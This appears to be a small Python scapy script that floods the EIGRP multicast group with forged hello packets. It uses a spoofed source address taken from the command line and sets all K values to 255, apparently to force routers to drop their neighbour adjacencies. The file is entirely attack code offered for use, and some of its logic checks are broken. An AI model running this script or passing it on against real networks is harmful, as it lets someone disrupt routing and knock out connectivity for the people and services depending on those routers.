from scapy.all import *
import time
import IP_scanner as ip
load_contrib('eigrp')
def eigrp(address):
   for i in range(0,25):
       sendp(Ether()/IP(src=address,dst="224.0.0.10")/EIGRP(asn=100,
    							 tlvlist=[EIGRPParam(k1=255,k2=255,k3=255,k4=255,k5=255),EIGRPSwVer()]))
       time.sleep(1)
      
       
def main():
    function = sys.argv[1]
    if function == 'eigrp':
        if len(sys.argv) < 1:
            print(sys.argv[0])
        else:
            print(sys.argv)
            p = (sys.argv[2])
            eigrp(p)
if {__name__ == "__main__"}:
    main()